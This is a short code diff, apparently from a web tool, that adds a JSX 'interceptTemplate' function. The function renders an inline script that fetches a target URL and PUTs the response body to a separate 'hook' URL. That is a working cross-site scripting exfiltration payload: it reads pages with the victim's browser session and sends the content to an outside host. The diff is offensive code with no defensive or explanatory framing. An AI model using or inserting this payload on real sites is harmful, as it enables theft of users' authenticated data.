@@ -45,3 +45,15 @@ export const logTemplate = (url: string, logs: string[]) => {
         </div>
     );
 }
+
+export const interceptTemplate = (intercepturl: string, hookurl: string) => {
+    return (
+        <div>
+            <script type="text/javascript" dangerouslySetInnerHTML={{
+                __html: `
+    fetch("${intercepturl}").then(x => x.text()).then(txt => fetch("${hookurl}", { method: "PUT", body:txt}))
+      `
+            }}/>
+        </div>
+    );
+}
